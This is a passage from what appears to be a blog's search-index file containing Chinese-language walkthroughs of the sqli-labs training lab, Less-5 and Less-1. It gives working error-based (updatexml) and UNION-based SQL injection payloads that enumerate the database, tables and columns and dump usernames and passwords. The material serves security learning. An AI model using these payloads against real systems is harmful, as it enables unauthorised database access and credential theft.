href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p>通过分析上面的代码得知，数据库会报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>于是我们可以尝试使用updatexml报错注入，因为有时候报错注入的致命错误会显示出来，数据库只忽略普通报错</p><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),1) --+</code><br><img src="/img/23.png"></p><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;~&#39;),1) --+</code><br><img src="/img/24.png"></p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39; limit 1,1),&#39;~&#39;),1) --+</code><br><img src="/img/25.png"><br>limlt 2，1<br><img src="/img/26.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select username,password from users limit 0,1),&#39;~&#39;),1) --+</code><br><img src="/img/27.png"><br>一个字段一个字段来<br><code>Less-5/?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(password) from users ),&#39;~&#39;),1) --+</code><br><img src="/img/28.png"></p><p>第六关和第五关(“闭合)类似，这里就不再过多赘述</p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-1</title>
      <link href="/sqli-lab-Less-1.html"/>
      <url>/sqli-lab-Less-1.html</url>
      
        <content type="html"><![CDATA[<h2 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h2><p>加入单引号查看是存在注入Less-1&#x2F;?id&#x3D;1’<br><img src="/img/11.png"><br>发现报语法错误，说明’被带入数据库中查询，并未被过滤，原因是无论字符型还是整型都会因为单引号个数不匹配而报错，说明大概率存在sql注入漏洞</p><h2 id="判断注入点类型（字符型或数字型）"><a href="#判断注入点类型（字符型或数字型）" class="headerlink" title="判断注入点类型（字符型或数字型）"></a>判断注入点类型（字符型或数字型）</h2><p>Less-1&#x2F;?id&#x3D;1’and ‘1’&#x3D;’1<br><img src="/img/12.png"><br>Less-1&#x2F;?id&#x3D;1’and ‘1’&#x3D;’2<br><img src="/img/13.png"><br>则推断出为字符型注入点</p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p>知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数<br>?id&#x3D;1’order by 3 –+<br>order by 4 报错<br><img src="/img/14.png"></p><h2 id="判断显错位"><a href="#判断显错位" class="headerlink" title="判断显错位"></a>判断显错位</h2><p>判断其第几列有回显，这里注意id后面的数字要采用一个不存在的数字，比如-1<br><code>Less-1/?id=-1&#39; union select 1,2,3 --+</code><br><img src="/img/15.png"><br>2和3都是显错位</p><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>Less-1/?id=-1&#39; union select 1,database(),3 --+</code><br><img src="/img/16.png"></p><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>Less-1/?id=-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 3,1 --+</code><br><img src="/img/17.png"><br><code>Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="/img/18.png"><br>第二种虽然方便，但显示位不够时可能出现问题</p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;user&#39; --+</code><br>同样也可以使用limit一个一个显示<br><img src="/img/19.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p><code>Less-1/?id=-1&#39; union select 1,username,password from users --+</code><br><img src="/img/20.png"><br><code>Less-1/?id=-1&#39; union select 1,username,password from users limit 1,1 --+</code><br><img src="/img/21.png"><br>同样也可一次性显示<br><code>Less-1/?id=-1&#39; union select 1,2,group_concat(id,username,password) from users limit 1,1 --+</code><br><img src="/img/22.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqlilab </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
